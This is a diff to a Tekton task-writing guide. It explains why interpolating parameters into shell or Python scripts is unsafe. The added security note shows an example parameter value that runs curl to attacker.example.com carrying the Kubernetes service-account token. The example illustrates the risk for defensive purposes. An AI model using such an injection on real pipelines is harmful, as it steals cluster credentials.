@@ -61,7 +61,27 @@ On the catalog, this means that you should, where possible:
         privileged: true
   ```
 
-## Don't use interpolation in shell scripts
+## Remember that there are other languages than sh and bash
+
+Yes, sh and bash are DSLs for running processes, but sometimes there
+are other languages more suited for what you're trying to do.  Tekton
+Pipelines' main positive attribute is the ability to have the right
+tool available for every step, and that includes the _interpreter_.
+Use python or another scripting languages when that is warranted.
+
+A python example:
+
+```
+  steps:
+    - name: foo
+      image: python:alpine
+      script: |
+        #!/bin/env python
+        import os
+        print(os.getenv('PARAM_ONE'))
+```
+
+## Don't use interpolation in scripts or string arguments
 
 Using `$(tekton.task)` interpolation in the `script` or as a `sh -c`
 string is extremely fragile.  The interpolation done by tekton is not
@@ -84,10 +104,35 @@ script might look like this:
 echo '
 ```
 
-This script is not valid, and the task will fail.
+This script is not valid, and the task will fail:
+
+```
+sh: 1: Syntax error: Unterminated quoted string
+```
+
+This goes for standard shell scripts, python scripts or any other
+script where tekton ends up interpolating variables.  Different
+languages have different quoting rules in different contexts, but a
+maliciously formed parameter would be able to break out of any
+quoting.
+
+No amount of escaping will be air-tight.  Even python `"""` strings.
+A maliciously formed parameter just needs to include another `"""` to
+close the string:
+
+```
+    script: |
+      #!/bin/env python
+      value = """$(params.one)"""
+      print(value)
+```
+
+If the parameter has the value `"""` followed by a line break, then
+the anything after the parameter's newline will be interpreted as
+**python code**, probably causing the script to fail, or worse.
 
 Instead, use environment variables or arguments, which are not
-interpolated into the script
+interpolated into the script source code:
 
 ```
   steps:
@@ -96,13 +141,24 @@ interpolated into the script
     env:
       - name: PARAM_ONE
         value: $(params.one)
+    args:
+      - $(params.one)
     script: |
       echo "$PARAM_ONE"
+      echo "$1"
 ```
 
-The script will now correctly print out the value of $PARAM_ONE,
-regardless of what it contains.
+The script will now correctly print out the value of params.one,
+regardless of what it contains; both environment variables and
+arguments.
 
+It is worth mentioning that an interpolated script (i.e. one that has
+`$(params.values)` in it) is a security problem.  If an attacker is
+able to send in a parameter value that looks something like `$(curl -s
+http://attacker.example.com/?value=$(cat
+/var/run/secrets/kubernetes.io/serviceaccount/token))`, then the
+attacker would be able to exfiltrate the service account token for the
+TaskRun.
 
 ## Extract task code (scripts) to their own files
 
@@ -153,15 +209,7 @@ kubectl create configmap my-task-scripts --from-file=my-command.sh
 ```
 
 For bonus points, use a kustomize generator to create your task; this
-allows you simple "kubectl apply -k" 
-
-## Remember that there are other languages than sh and bash
-
-Yes, sh and bash are DSLs for running processes, but sometimes there
-are other languages more suited for what you're trying to do.  Tekton
-Pipelines' main positive attribute is the ability to have the right
-tool available for every step, and that includes the _interpreter_.
-Use python or other scripting languages when that is warranted.
+allows you simple "kubectl apply -k".
 
 ## Test and verify your task code
 
